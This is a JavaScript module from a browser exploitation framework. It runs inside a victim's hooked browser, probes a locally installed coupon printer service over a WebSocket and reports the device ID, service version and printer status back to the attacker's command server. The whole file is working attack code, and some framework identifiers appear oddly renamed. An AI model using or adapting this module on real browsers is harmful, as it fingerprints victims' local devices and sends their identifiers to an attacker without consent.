//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  if (!server.browser.hasWebSocket()) {
    server.debug('[Detect Coupon Printer] Error: browser does not support WebSockets');
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", server.are.status_error());
  }

  //var url = 'ws://127.0.0.1:2687';
  //var url = 'ws://127.0.0.1:26876';
  var url = 'wss://printer.cpnprt.com:4004'; // resolves to 127.0.0.1

  server.debug('[Detect Coupon Printer] Opening WebSocket connection: ' + url);
  const socket = new WebSocket(url);

  socket.addEventListener('open', function (event) {

    // Get Coupon Printer Service version
    socket.send('method=GetVersion;input=Y|;separator=|');

    // Device ID
    socket.send('method=GetDeviceID;input=Y|;separator=|');

    // Check Printer
    socket.send('method=CheckPrinter;input=Y|;separator=|');

  });

  socket.onerror = function(error) {
    server.debug('[Detect Coupon Printer] WebSocket Error: ' + JSON.stringify(error));
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not detect coupon printer", server.are.status_error());
  };

  socket.onclose = function(event) {
    server.debug('[Detect Coupon Printer] Disconnected from WebSocket.');
  };

  socket.addEventListener('message', function (event) {
    server.debug('[Detect Coupon Printer] WebSocket Response:' + event.data);
    try {
      var result = JSON.parse(event.data);
      if (result['GetVersion']) {
        server.debug('[Detect Coupon Printer] Version: ' + result['GetVersion']);
        server.net.send("<%= @command_url %>", <%= @command_id %>, "GetVersion=" + result['GetVersion'], server.are.status_success());
      } else if (result['GetDeviceID']) {
        server.debug('[Detect Coupon Printer] Device ID: ' + result['GetDeviceID']);
        server.net.send("<%= @command_url %>", <%= @command_id %>, "GetDeviceID=" + result['GetDeviceID'], server.are.status_success());
      } else if (result['CheckPrinter']) {
        server.debug('[Detect Coupon Printer] Printer: ' + result['CheckPrinter']);
        server.net.send("<%= @command_url %>", <%= @command_id %>, "CheckPrinter=" + result['CheckPrinter'], server.are.status_success());
      }
    } catch(e) {
      server.debug('Could not parse WebSocket response JSON: ' + event.data);
    }
  });

});

